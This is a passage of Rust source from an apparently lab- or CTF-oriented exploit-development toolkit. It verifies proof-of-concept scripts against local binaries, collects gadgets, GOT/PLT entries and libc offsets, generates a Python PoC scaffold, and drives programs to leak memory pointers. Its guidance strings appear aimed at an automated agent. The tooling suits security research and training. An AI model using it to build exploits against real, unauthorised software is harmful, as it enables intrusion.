    timeout_secs: u64,
    expect_exit: Option<i32>,
    expect_target_exit: Option<i32>,
    expect_output: Option<&str>,
    sysroot: Option<&Path>,
    args: &[String],
) -> Result<serde_json::Value> {
    let script = script
        .canonicalize()
        .with_context(|| format!("script not found: {}", script.display()))?;
    let binary = binary
        .canonicalize()
        .unwrap_or_else(|_| binary.to_path_buf());
    let binary_data = std::fs::read(&binary).unwrap_or_default();
    let arch = binary_arch_from_data(&binary_data);
    let interpreter = binary_interpreter_from_data(&binary_data);
    let effective_sysroot = effective_sysroot(sysroot, arch.as_deref(), interpreter.as_deref());
    let timeout = Duration::from_secs(timeout_secs.clamp(1, 300));
    let mut cmd = Command::new("python3");
    cmd.arg(&script)
        .args(args)
        .env("KAIJU_BINARY", &binary)
        .env("KAIJULAB_BINARY", &binary)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .stdin(Stdio::null());
    if let Some(qemu) = find_in_path("qemu-i386-static").or_else(|| find_in_path("qemu-i386")) {
        cmd.env("QEMU_I386", qemu);
    }
    if let Some(qemu) = find_in_path("qemu-x86_64-static").or_else(|| find_in_path("qemu-x86_64")) {
        cmd.env("QEMU_X86_64", qemu);
    }
    if let Some(sysroot) = effective_sysroot.as_deref() {
        cmd.env("KAIJU_SYSROOT", sysroot)
            .env("KAIJULAB_SYSROOT", sysroot);
    }
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0);
    }

    let start = Instant::now();
    let program = format!("{:?}", cmd);
    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(e) => {
            return Ok(serde_json::json!({
                "command": program,
                "spawn_error": e.to_string(),
                "timed_out": false,
                "duration_ms": start.elapsed().as_millis(),
                "exit_code": null,
                "signal": null,
                "stdout": "",
                "stderr": "",
                "stdout_truncated": false,
                "stderr_truncated": false,
            }));
        }
    };
    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");
    let stdout_thread = std::thread::spawn(move || read_limited(stdout, 256 * 1024));
    let stderr_thread = std::thread::spawn(move || read_limited(stderr, 256 * 1024));

    let timed_out = loop {
        if child.try_wait()?.is_some() {
            break false;
        }
        if start.elapsed() >= timeout {
            #[cfg(unix)]
            unsafe {
                libc::killpg(child.id() as i32, libc::SIGKILL);
            }
            #[cfg(not(unix))]
            {
                let _ = child.kill();
            }
            let _ = child.wait();
            break true;
        }
        std::thread::sleep(Duration::from_millis(50));
    };
    let status = child.try_wait()?.or_else(|| child.wait().ok());
    let stdout = stdout_thread.join().unwrap_or_default();
    let stderr = stderr_thread.join().unwrap_or_default();
    let stdout_text = String::from_utf8_lossy(&stdout).into_owned();
    let stderr_text = String::from_utf8_lossy(&stderr).into_owned();
    let exit_code = status.and_then(|s| s.code());
    let combined = format!("{}{}", stdout_text, stderr_text);

    let has_predicate =
        expect_exit.is_some() || expect_target_exit.is_some() || expect_output.is_some();
    let blocked_marker = combined.contains("SCRIPT_READY_BLOCKED");
    let exit_ok = expect_exit.map_or(true, |code| exit_code == Some(code));
    let target_exit_ok = expect_target_exit.map_or(true, |code| {
        combined.contains(&format!("returncode={code}"))
            || combined.contains(&format!("returncode: {code}"))
            || combined.contains(&format!("return code {code}"))
            || combined.contains(&format!("exit({code})"))
            || combined.contains(&format!("exit code: {code}"))
            || combined.contains(&format!("Exit code: {code}"))
    });
    let output_ok = expect_output.map_or(true, |needle| combined.contains(needle));
    let success =
        has_predicate && !blocked_marker && !timed_out && exit_ok && target_exit_ok && output_ok;
    Ok(serde_json::json!({
        "success": success,
        "has_predicate": has_predicate,
        "blocked_marker": blocked_marker,
        "timed_out": timed_out,
        "exit_code": exit_code,
        "expected_exit": expect_exit,
        "expected_target_exit": expect_target_exit,
        "expected_output": expect_output,
        "stdout": stdout_text,
        "stderr": stderr_text,
        "script": script,
        "binary": binary,
        "next_action": if blocked_marker {
            "SCRIPT_READY_BLOCKED is an environment-blocker marker, not exploit proof; fix the blocker or continue exploit development."
        } else if !has_predicate {
            "No explicit success predicate was provided; rerun exploit-verify with --expect-target-exit, --expect-exit, or --expect-output."
        } else if success {
            "Stop. Preserve the PoC and summarize why the predicate proves execution."
        } else if timed_out {
            "Add tighter process timeouts and avoid interactive loops; rerun exploit-verify."
        } else if !exit_ok {
            "Inspect crash/exit path, adjust payload or predicate, rerun exploit-verify."
        } else if !target_exit_ok {
            "Target-exit predicate missing; print returncode=<N> from the PoC or adjust predicate."
        } else {
            "Predicate output missing; inspect stdout/stderr and rerun exploit-verify."
        },
    }))
}

fn binary_facts_json(binary: &Path, max: usize) -> Result<serde_json::Value> {
    let context = build_exploit_context(binary, 12)?;
    let kit = exploit_kit_json(binary, None, None, 8192, 12)?;
    let ir = ir_query_json(binary, None, None, max)?;
    let strategy = inferred_exploit_strategy(binary)?;
    let strings = ir
        .get("strings")
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default();
    let prompt_strings: Vec<_> = strings
        .iter()
        .filter(|value| {
            value
                .get("text")
                .and_then(|v| v.as_str())
                .map(|text| {
                    let lower = text.to_ascii_lowercase();
                    text.contains(':')
                        || text.contains('?')
                        || lower.contains("choice")
                        || lower.contains("size")
                        || lower.contains("index")
                        || lower.contains("content")
                })
                .unwrap_or(false)
        })
        .take(max)
        .cloned()
        .collect();
    Ok(serde_json::json!({
        "kind": "binary_facts",
        "binary": binary,
        "arch": context.get("arch"),
        "format": context.get("format"),
        "protections": context.get("protections"),
        "runtime": context.get("runtime"),
        "adjacent_shared_objects": context.get("adjacent_shared_objects"),
        "imports_sample": context.get("imports_sample"),
        "prompt_strings": prompt_strings,
        "functions": ir.get("functions"),
        "plt": kit.get("plt"),
        "got": kit.get("got"),
        "gadgets": kit.get("gadgets"),
        "libc_offsets": strategy.get("libc_symbol_offsets"),
        "ranked_exploit_families": strategy.get("ranked_families"),
        "recommended_next_tools": [
            "exploit-scaffold --output /tmp/poc.py",
            "exploit-drive --actions @actions.json --expect <prompt-or-marker>",
            "leak-probe --setup @setup.json --cycle @cycle.json --want libc",
            "heap-model --events @heap-events.json",
            "libc-resolve --leak 0xADDR --symbol puts",
            "exploit-plan --primitive libc-leak --primitive arbitrary-write",
            "poc-synthesize --chain ret2libc --offset N --libc-base 0xBASE --output /tmp/poc.py",
            "constraint-plan --mode sorted-ascending --value 0xADDR --value 0xADDR",
            "poc-repair /tmp/poc.py --verify @verify.json",
            "heap-probe-plan",
            "runtime-run/debug-probe/exploit-verify with --save-evidence for meaningful observations"
        ],
    }))
}

fn exploit_scaffold_json(
    binary: &Path,
    output: Option<&Path>,
    sysroot: Option<&Path>,
) -> Result<serde_json::Value> {
    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
    let arch = binary_arch_from_data(&data);
    let interpreter = binary_interpreter_from_data(&data);
    let effective_sysroot = effective_sysroot(sysroot, arch.as_deref(), interpreter.as_deref());
    let runner = default_runner_for_arch(arch.as_deref());
    let text = exploit_scaffold_text(binary, runner.as_deref(), effective_sysroot.as_deref());
    if let Some(output) = output {
        std::fs::write(output, &text).with_context(|| format!("write {}", output.display()))?;
    }
    Ok(serde_json::json!({
        "kind": "exploit_scaffold",
        "binary": binary,
        "output": output,
        "arch": arch,
        "runner": runner,
        "sysroot": effective_sysroot.as_deref(),
        "text": text,
        "next_action": "Fill exploit actions, then run exploit-verify with --expect-target-exit 42 or --expect-output MARKER.",
    }))
}

fn exploit_scaffold_text(binary: &Path, runner: Option<&str>, sysroot: Option<&Path>) -> String {
    let qemu_default = runner.unwrap_or("");
    let sysroot_default = sysroot
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    format!(
        r#"#!/usr/bin/env python3
import os
import select
import struct
import subprocess
import sys

BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {binary:?}
SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot_default:?}
RUNNER = os.environ.get("KAIJU_RUNNER") or {qemu_default:?}

def p32(x): return struct.pack("<I", x & 0xffffffff)
def p64(x): return struct.pack("<Q", x & 0xffffffffffffffff)

def argv():
    if RUNNER:
        out = [RUNNER]
        if SYSROOT:
            out += ["-L", SYSROOT]
        out.append(BIN)
        return out
    return [BIN]

class Tube:
    def __init__(self):
        self.p = subprocess.Popen(argv(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def line(self, data=b""):
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")

    def choice(self, n):
        self.line(str(n).encode())

    def finish(self, tail=b"", timeout=5):
        if tail:
            self.send(tail)
        try:
            out, err = self.p.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            self.p.kill()
            out, err = self.p.communicate()
        sys.stdout.buffer.write(out)
        sys.stderr.buffer.write(err)
        print("returncode=%d" % self.p.returncode)
        return self.p.returncode

def main():
    t = Tube()
    # TODO: replace this transcript with exploit actions.
    # t.choice(1); t.line(b"32"); t.line(b"A" * 32)
    rc = t.finish(timeout=5)
    return 0 if rc == 42 else 1

if __name__ == "__main__":
    raise SystemExit(main())
"#,
        binary = binary.to_string_lossy()
    )
}

fn exploit_interact_json(
    binary: &Path,
    actions_spec: &str,
    expects: &[String],
    sysroot: Option<&Path>,
    timeout_secs: u64,
) -> Result<serde_json::Value> {
    let actions_value = read_json_or_inline(actions_spec)?;
    let actions = actions_value
        .get("actions")
        .and_then(|v| v.as_array())
        .or_else(|| actions_value.as_array())
        .ok_or_else(|| {
            anyhow::anyhow!("--actions must be a JSON array or object with actions[]")
        })?;
    let (stdin_bytes, action_log, inline_expects) = compile_interaction_actions(actions)?;
    let mut stdin_file = tempfile::NamedTempFile::new()?;
    stdin_file.write_all(&stdin_bytes)?;
    let stdin_arg = format!("@{}", stdin_file.path().display());
    let runtime = runtime_run_json(
        binary,
        &[],
        &[],
        Some(&stdin_arg),
        None,
        None,
        sysroot,
        timeout_secs,
    )?;
    let combined = format!(
        "{}{}",
        runtime
            .pointer("/result/stdout")
            .and_then(|v| v.as_str())
            .unwrap_or(""),
        runtime
            .pointer("/result/stderr")
            .and_then(|v| v.as_str())
            .unwrap_or("")
    );
    let all_expects: Vec<String> = expects.iter().cloned().chain(inline_expects).collect();
    let expectation_results: Vec<_> = all_expects
        .iter()
        .map(|needle| {
            serde_json::json!({
                "needle": needle,
                "present": combined.contains(needle),
            })
        })
        .collect();
    let success = expectation_results
        .iter()
        .all(|v| v.get("present").and_then(|p| p.as_bool()).unwrap_or(false));
    Ok(serde_json::json!({
        "kind": "exploit_interact",
        "binary": binary,
        "actions": action_log,
        "stdin_len": stdin_bytes.len(),
        "expectations": expectation_results,
        "success": success,
        "runtime": runtime,
        "next_action": if success {
            "Transcript matched expectations; convert the same actions into a PoC scaffold or add a stronger exploit predicate."
        } else {
            "Expectation missing; inspect runtime stdout/stderr and adjust prompt synchronization or action sequence."
        },
    }))
}

fn read_json_or_inline(spec: &str) -> Result<serde_json::Value> {
    let text = if let Some(path) = spec.strip_prefix('@') {
        std::fs::read_to_string(path).with_context(|| format!("read {path}"))?
    } else {
        spec.to_string()
    };
    serde_json::from_str(&text).with_context(|| "parse JSON action spec")
}

fn compile_interaction_actions(
    actions: &[serde_json::Value],
) -> Result<(Vec<u8>, Vec<serde_json::Value>, Vec<String>)> {
    let mut stdin = Vec::new();
    let mut log = Vec::new();
    let mut expects = Vec::new();
    for (idx, action) in actions.iter().enumerate() {
        let obj = action
            .as_object()
            .ok_or_else(|| anyhow::anyhow!("action {idx} must be an object"))?;
        if let Some(value) = obj.get("send_choice") {
            let text = if let Some(n) = value.as_i64() {
                n.to_string()
            } else if let Some(s) = value.as_str() {
                s.to_string()
            } else {
                anyhow::bail!("action {idx} send_choice must be string or integer");
            };
            stdin.extend_from_slice(text.as_bytes());
            stdin.push(b'\n');
            log.push(serde_json::json!({"send_choice": text}));
        } else if let Some(value) = obj.get("send_line") {
            let text = value
                .as_str()
                .ok_or_else(|| anyhow::anyhow!("action {idx} send_line must be string"))?;
            stdin.extend_from_slice(text.as_bytes());
            stdin.push(b'\n');
            log.push(serde_json::json!({"send_line": text}));
        } else if let Some(value) = obj.get("send_text") {
            let text = value
                .as_str()
                .ok_or_else(|| anyhow::anyhow!("action {idx} send_text must be string"))?;
            stdin.extend_from_slice(text.as_bytes());
            log.push(serde_json::json!({"send_text_len": text.len()}));
        } else if let Some(value) = obj.get("send_hex").or_else(|| obj.get("send_bytes_hex")) {
            let text = value
                .as_str()
                .ok_or_else(|| anyhow::anyhow!("action {idx} send_hex must be string"))?;
            let compact: String = text.chars().filter(|c| !c.is_ascii_whitespace()).collect();
            let bytes = hex::decode(&compact)
                .with_context(|| format!("action {idx} send_hex invalid hex"))?;
            stdin.extend_from_slice(&bytes);
            log.push(serde_json::json!({"send_hex_len": bytes.len()}));
        } else if let Some(value) = obj.get("sleep_ms") {
            log.push(serde_json::json!({"sleep_ms": value}));
        } else if let Some(value) = obj.get("expect") {
            let text = value
                .as_str()
                .ok_or_else(|| anyhow::anyhow!("action {idx} expect must be string"))?;
            expects.push(text.to_string());
            log.push(serde_json::json!({"expect": text}));
        } else {
            anyhow::bail!("action {idx} has no known key");
        }
    }
    Ok((stdin, log, expects))
}

struct DriveRun {
    value: serde_json::Value,
    combined: Vec<u8>,
}

fn exploit_drive_json(
    binary: &Path,
    actions_spec: &str,
    expects: &[String],
    runner: Option<&str>,
    sysroot: Option<&Path>,
    timeout_secs: u64,
    step_timeout_ms: u64,
    max_output: usize,
) -> Result<serde_json::Value> {
    let actions = action_list_from_spec(actions_spec)?;
    let run = run_stepwise_drive(
        binary,
        &actions,
        runner,
        sysroot,
        timeout_secs,
        step_timeout_ms,
        max_output,
    )?;
    let text = String::from_utf8_lossy(&run.combined);
    let expectation_results: Vec<_> = expects
        .iter()
        .map(|needle| {
            serde_json::json!({
                "needle": needle,
                "present": text.contains(needle),
            })
        })
        .collect();
    let expectations_ok = expectation_results
        .iter()
        .all(|v| v.get("present").and_then(|p| p.as_bool()).unwrap_or(false));
    let steps_ok = run
        .value
        .get("steps_ok")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let timed_out = run
        .value
        .get("timed_out")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let mut value = run.value;
    value["expectations"] = serde_json::json!(expectation_results);
    value["success"] = serde_json::json!(steps_ok && expectations_ok && !timed_out);
    value["next_action"] = serde_json::json!(if value
        .get("success")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        "Driver synchronized successfully; move this transcript into a PoC or add a stronger leak/control predicate."
    } else if timed_out {
        "A receive/send-after step timed out; inspect steps[].tail_text and split the transcript at the last matched prompt."
    } else {
        "One or more expectations failed; inspect transcript tails and adjust recv_until/sendline_after prompts."
    });
    Ok(value)
}

fn leak_probe_json(
    binary: &Path,
    setup_spec: Option<&str>,
    cycle_spec: &str,
    contains: &[String],
    wants: &[String],
    runner: Option<&str>,
    sysroot: Option<&Path>,
    timeout_secs: u64,
    step_timeout_ms: u64,
    max_rounds: u32,
    max_output: usize,
) -> Result<serde_json::Value> {
    let mut actions = Vec::new();
    if let Some(setup) = setup_spec {
        actions.extend(action_list_from_spec(setup)?);
    }
    let cycle = action_list_from_spec(cycle_spec)?;
    for _ in 0..max_rounds.clamp(1, 64) {
        actions.extend(cycle.iter().cloned());
    }
    let run = run_stepwise_drive(
        binary,
        &actions,
        runner,
        sysroot,
        timeout_secs,
        step_timeout_ms,
        max_output,
    )?;
    let data = std::fs::read(binary).unwrap_or_default();
    let arch = binary_arch_from_data(&data);
    let mappings = parse_proc_maps(&run.combined);
    let pointers = extract_pointer_candidates(&run.combined, &mappings, arch.as_deref(), 96);
    let text = String::from_utf8_lossy(&run.combined);
    let contains_results: Vec<_> = contains
        .iter()
        .map(|needle| {
            serde_json::json!({
                "needle": needle,
                "present": text.contains(needle),
            })
        })
        .collect();
    let contains_ok = contains_results
        .iter()
        .all(|v| v.get("present").and_then(|p| p.as_bool()).unwrap_or(false));
    let want_results: Vec<_> = wants
        .iter()
        .map(|want| serde_json::json!({"want": want, "present": leak_want_present(want, &mappings, &pointers)}))
        .collect();
    let wants_ok = if wants.is_empty() {
        !mappings.is_empty() || !pointers.is_empty()
    } else {
        want_results
            .iter()
            .all(|v| v.get("present").and_then(|p| p.as_bool()).unwrap_or(false))
    };
    let timed_out = run
        .value
        .get("timed_out")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    Ok(serde_json::json!({
        "kind": "leak_probe",
        "binary": binary,
        "arch": arch,
        "rounds": max_rounds.clamp(1, 64),
        "success": contains_ok && wants_ok && !timed_out,
        "contains": contains_results,
        "wants": want_results,
        "mappings": mappings,
        "pointer_candidates": pointers,
        "drive": run.value,
        "next_action": if contains_ok && wants_ok && !timed_out {
            "Use the harvested mapping/pointer class to compute the target base or libc base, then verify the exploit predicate."
        } else if timed_out {
            "Leak transcript timed out; shorten each cycle or add recv_until prompts before sends."
        } else {
            "No requested leak class was harvested; adjust setup/cycle actions or increase --max-rounds with bounded output."
        },
    }))
}

fn action_list_from_spec(spec: &str) -> Result<Vec<serde_json::Value>> {
    let value = read_json_or_inline(spec)?;
    let actions = value
        .get("actions")
        .and_then(|v| v.as_array())
        .or_else(|| value.get("events").and_then(|v| v.as_array()))
        .or_else(|| value.as_array())
        .ok_or_else(|| {
            anyhow::anyhow!("action spec must be a JSON array or object with actions[]/events[]")
        })?;
    Ok(actions.clone())
}

fn run_stepwise_drive(
    binary: &Path,
    actions: &[serde_json::Value],
    runner: Option<&str>,
    sysroot: Option<&Path>,
    timeout_secs: u64,
    step_timeout_ms: u64,
    max_output: usize,
) -> Result<DriveRun> {
    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
    let arch = binary_arch_from_data(&data);
    let interpreter = binary_interpreter_from_data(&data);
    let effective_sysroot = effective_sysroot(sysroot, arch.as_deref(), interpreter.as_deref());
    let effective_runner = runner
        .map(|r| r.to_string())
        .or_else(|| default_runner_for_arch(arch.as_deref()));
    let mut cmdline = Vec::new();
    if let Some(runner) = &effective_runner {
        cmdline.push(runner.to_string());
        if let Some(sysroot) = effective_sysroot.as_deref() {
            cmdline.push("-L".to_string());
            cmdline.push(sysroot.to_string_lossy().into_owned());
        }
    }
    cmdline.push(binary.to_string_lossy().into_owned());

    let mut cmd = Command::new(&cmdline[0]);
    cmd.args(&cmdline[1..])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0);
    }
    let start = Instant::now();
    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(e) => {
            return Ok(DriveRun {
                value: serde_json::json!({
                    "kind": "exploit_drive",
                    "binary": binary,
                    "cmd": cmdline,
                    "spawn_error": e.to_string(),
                    "success": false,
                    "steps_ok": false,
                    "timed_out": false,
                    "exit_code": null,
                    "stdout_tail": "",
                    "stderr_tail": "",
                    "combined_hex_tail": "",
                    "steps": [],
                }),
                combined: Vec::new(),
            });
        }
    };
    let mut stdin = child.stdin.take().context("child stdin unavailable")?;
    let stdout = child.stdout.take().context("child stdout unavailable")?;
    let stderr = child.stderr.take().context("child stderr unavailable")?;
    let (tx, rx) = mpsc::channel();
    spawn_drive_reader("stdout", stdout, tx.clone());
    spawn_drive_reader("stderr", stderr, tx);

    let total_deadline = start + Duration::from_secs(timeout_secs.clamp(1, 300));
    let mut combined = Vec::new();
    let mut stdout_buf = Vec::new();
    let mut stderr_buf = Vec::new();
    let mut steps = Vec::new();
    let mut steps_ok = true;
    let mut timed_out = false;
    let retain = max_output.clamp(4096, 4 * 1024 * 1024);

    for (idx, action) in actions.iter().enumerate() {
        if Instant::now() >= total_deadline {
            timed_out = true;
            steps_ok = false;
            break;
        }
        let step = perform_drive_action(
            idx,
            action,
            &mut stdin,
            &rx,
            &mut combined,
            &mut stdout_buf,
            &mut stderr_buf,
            retain,
            total_deadline,
            step_timeout_ms,
        )?;
        let ok = step.get("ok").and_then(|v| v.as_bool()).unwrap_or(false);
        if !ok {
            steps_ok = false;
            timed_out |= step
                .get("timed_out")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            steps.push(step);
            break;
        }
        steps.push(step);
        if child.try_wait()?.is_some() {
            break;
        }
    }
    drain_drive_output(
        &rx,
        &mut combined,
        &mut stdout_buf,
        &mut stderr_buf,
        retain,
        Instant::now() + Duration::from_millis(150),
    );
    let mut left_running = false;
    if child.try_wait()?.is_none() {
        left_running = !timed_out;
        #[cfg(unix)]
        unsafe {
            libc::killpg(child.id() as i32, libc::SIGKILL);
        }
        #[cfg(not(unix))]
        {
            let _ = child.kill();
        }
    }
    let status = child.wait().ok();
    drain_drive_output(
        &rx,
        &mut combined,
        &mut stdout_buf,
        &mut stderr_buf,
        retain,
        Instant::now() + Duration::from_millis(150),
    );
    let exit_code = status.and_then(|s| s.code());
    Ok(DriveRun {
        value: serde_json::json!({
            "kind": "exploit_drive",
            "binary": binary,
            "cmd": cmdline,
            "runner_selected": effective_runner,
            "sysroot_selected": effective_sysroot.as_deref(),
            "timeout_secs": timeout_secs.clamp(1, 300),
            "step_timeout_ms": step_timeout_ms,
            "success": steps_ok && !timed_out,
            "steps_ok": steps_ok,
            "timed_out": timed_out,
            "left_running": left_running,
            "exit_code": exit_code,
            "duration_ms": start.elapsed().as_millis(),
            "steps": steps,
            "stdout_tail": lossy_tail(&stdout_buf, 4096),
            "stderr_tail": lossy_tail(&stderr_buf, 4096),
            "combined_tail": lossy_tail(&combined, 8192),
            "combined_hex_tail": hex_tail(&combined, 512),
        }),
        combined,
    })
}

fn spawn_drive_reader<R: Read + Send + 'static>(
    stream: &'static str,
    mut reader: R,
    tx: mpsc::Sender<(&'static str, Vec<u8>)>,
) {
    std::thread::spawn(move || {
        let mut buf = [0u8; 4096];
        loop {
            match reader.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    if tx.send((stream, buf[..n].to_vec())).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });
}

fn perform_drive_action(
    idx: usize,
    action: &serde_json::Value,
    stdin: &mut dyn Write,
    rx: &mpsc::Receiver<(&'static str, Vec<u8>)>,
    combined: &mut Vec<u8>,
    stdout: &mut Vec<u8>,
    stderr: &mut Vec<u8>,
    retain: usize,
    total_deadline: Instant,
    default_step_timeout_ms: u64,
) -> Result<serde_json::Value> {
    let before = combined.len();
    let obj = action
        .as_object()
        .ok_or_else(|| anyhow::anyhow!("action {idx} must be an object"))?;
    let step_start = Instant::now();
    let mut ok = true;
    let mut timed_out = false;
    let mut detail = serde_json::Map::new();

    if let Some(value) = obj.get("recv_until") {
        let (needle, timeout_ms) = recv_action_spec(value, default_step_timeout_ms, idx)?;
        let deadline = step_deadline(total_deadline, timeout_ms);
        ok = wait_for_bytes(rx, combined, stdout, stderr, retain, &needle, deadline);
        timed_out = !ok;
        detail.insert(
            "recv_until".to_string(),
            serde_json::json!(String::from_utf8_lossy(&needle)),
        );
    } else if let Some(value) = obj
        .get("sendline_after")
        .or_else(|| obj.get("send_line_after"))
    {
        let (needle, bytes, timeout_ms) = send_after_spec(value, default_step_timeout_ms, idx)?;
        let deadline = step_deadline(total_deadline, timeout_ms);
        ok = wait_for_bytes(rx, combined, stdout, stderr, retain, &needle, deadline);
        timed_out = !ok;
        if ok {
            stdin.write_all(&bytes)?;
            stdin.write_all(b"\n")?;
            stdin.flush()?;
        }
        detail.insert(
            "sendline_after".to_string(),
            serde_json::json!({
                "expect": String::from_utf8_lossy(&needle),
                "bytes_len": bytes.len(),
            }),
        );
    } else if let Some(value) = obj.get("send_after") {
        let (needle, bytes, timeout_ms) = send_after_spec(value, default_step_timeout_ms, idx)?;
        let deadline = step_deadline(total_deadline, timeout_ms);
        ok = wait_for_bytes(rx, combined, stdout, stderr, retain, &needle, deadline);
        timed_out = !ok;
        if ok {
            stdin.write_all(&bytes)?;
            stdin.flush()?;
        }
        detail.insert(
            "send_after".to_string(),
            serde_json::json!({
                "expect": String::from_utf8_lossy(&needle),
                "bytes_len": bytes.len(),
            }),
        );
    } else if let Some(value) = obj.get("send_choice") {
        let text = scalar_to_string(value, idx, "send_choice")?;
        stdin.write_all(text.as_bytes())?;
        stdin.write_all(b"\n")?;
        stdin.flush()?;
        detail.insert("send_choice".to_string(), serde_json::json!(text));
    } else if let Some(value) = obj.get("send_line") {
        let bytes = bytes_from_value(value, idx, "send_line")?;
        stdin.write_all(&bytes)?;
        stdin.write_all(b"\n")?;
        stdin.flush()?;
        detail.insert("send_line_len".to_string(), serde_json::json!(bytes.len()));
    } else if let Some(value) = obj.get("send_text") {
        let bytes = bytes_from_value(value, idx, "send_text")?;
        stdin.write_all(&bytes)?;
        stdin.flush()?;
        detail.insert("send_text_len".to_string(), serde_json::json!(bytes.len()));
    } else if let Some(value) = obj.get("send_hex").or_else(|| obj.get("send_bytes_hex")) {
        let bytes = hex_bytes_from_value(value, idx, "send_hex")?;
        stdin.write_all(&bytes)?;
        stdin.flush()?;
        detail.insert("send_hex_len".to_string(), serde_json::json!(bytes.len()));
    } else if let Some(value) = obj.get("expect") {
        let needle = bytes_from_value(value, idx, "expect")?;
        ok = find_bytes(combined, &needle).is_some()
            || wait_for_bytes(
                rx,
                combined,
                stdout,
                stderr,
                retain,
                &needle,
                step_deadline(total_deadline, default_step_timeout_ms),
            );
        timed_out = !ok;
        detail.insert(
            "expect".to_string(),
            serde_json::json!(String::from_utf8_lossy(&needle)),
        );
    } else if let Some(value) = obj.get("read_for_ms").or_else(|| obj.get("sleep_ms")) {
        let ms = value
            .as_u64()
            .ok_or_else(|| anyhow::anyhow!("action {idx} read_for_ms/sleep_ms must be integer"))?;
        drain_drive_output(
            rx,
            combined,
            stdout,
            stderr,
            retain,
            step_deadline(total_deadline, ms),
        );
        detail.insert("read_for_ms".to_string(), serde_json::json!(ms));
    } else {
        anyhow::bail!("action {idx} has no known key");
    }
    drain_drive_output(
        rx,
        combined,
        stdout,
        stderr,
        retain,
        Instant::now() + Duration::from_millis(25),
    );
    Ok(serde_json::json!({
        "index": idx,
        "ok": ok,
        "timed_out": timed_out,
        "duration_ms": step_start.elapsed().as_millis(),
        "received_delta": combined.len().saturating_sub(before),
        "tail_text": lossy_tail(combined, 1024),
        "tail_hex": hex_tail(combined, 128),
        "action": detail,
    }))
}

fn recv_action_spec(
    value: &serde_json::Value,
    default_timeout_ms: u64,
    idx: usize,
) -> Result<(Vec<u8>, u64)> {
    if value.is_string() || value.is_number() {
        return Ok((
            bytes_from_value(value, idx, "recv_until")?,
            default_timeout_ms,
        ));
    }
    let obj = value
        .as_object()
        .ok_or_else(|| anyhow::anyhow!("action {idx} recv_until must be string or object"))?;
    let needle = obj
        .get("text")
        .or_else(|| obj.get("expect"))
        .or_else(|| obj.get("prompt"))
        .or_else(|| obj.get("hex"))
        .ok_or_else(|| {
            anyhow::anyhow!("action {idx} recv_until object needs text/expect/prompt/hex")
        })?;
    let timeout = obj
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(default_timeout_ms);
    if obj.contains_key("hex") {
        Ok((
            hex_bytes_from_value(needle, idx, "recv_until.hex")?,
            timeout,
        ))
    } else {
        Ok((bytes_from_value(needle, idx, "recv_until")?, timeout))
    }
}

fn send_after_spec(
    value: &serde_json::Value,
    default_timeout_ms: u64,
    idx: usize,
) -> Result<(Vec<u8>, Vec<u8>, u64)> {
    let obj = value
        .as_object()
        .ok_or_else(|| anyhow::anyhow!("action {idx} send_after/sendline_after must be object"))?;
    let needle_value = obj
        .get("expect")
        .or_else(|| obj.get("prompt"))
        .or_else(|| obj.get("until"))
        .ok_or_else(|| anyhow::anyhow!("action {idx} send_after needs expect/prompt/until"))?;
    let data_value = obj
        .get("line")
        .or_else(|| obj.get("data"))
        .or_else(|| obj.get("text"))
        .or_else(|| obj.get("hex"))
        .ok_or_else(|| anyhow::anyhow!("action {idx} send_after needs line/data/text/hex"))?;
    let data = if obj.contains_key("hex") {
        hex_bytes_from_value(data_value, idx, "send_after.hex")?
    } else {
        bytes_from_value(data_value, idx, "send_after")?
    };
    let timeout = obj
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(default_timeout_ms);
    Ok((
        bytes_from_value(needle_value, idx, "send_after.expect")?,
        data,
        timeout,
    ))
}

fn scalar_to_string(value: &serde_json::Value, idx: usize, field: &str) -> Result<String> {
    if let Some(s) = value.as_str() {
        Ok(s.to_string())
    } else if let Some(n) = value.as_i64() {
        Ok(n.to_string())
    } else if let Some(n) = value.as_u64() {
        Ok(n.to_string())
    } else {
        anyhow::bail!("action {idx} {field} must be string or integer")
    }
}

fn bytes_from_value(value: &serde_json::Value, idx: usize, field: &str) -> Result<Vec<u8>> {
    Ok(scalar_to_string(value, idx, field)?.into_bytes())
}

fn hex_bytes_from_value(value: &serde_json::Value, idx: usize, field: &str) -> Result<Vec<u8>> {
    let text = value
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("action {idx} {field} must be hex string"))?;
    let compact: String = text.chars().filter(|c| !c.is_ascii_whitespace()).collect();
    hex::decode(&compact).with_context(|| format!("action {idx} {field} invalid hex"))
}

fn step_deadline(total_deadline: Instant, timeout_ms: u64) -> Instant {
    let step = Instant::now() + Duration::from_millis(timeout_ms.clamp(1, 120_000));
    if step < total_deadline {
        step
    } else {
        total_deadline
    }
}

fn wait_for_bytes(
    rx: &mpsc::Receiver<(&'static str, Vec<u8>)>,
    combined: &mut Vec<u8>,
    stdout: &mut Vec<u8>,
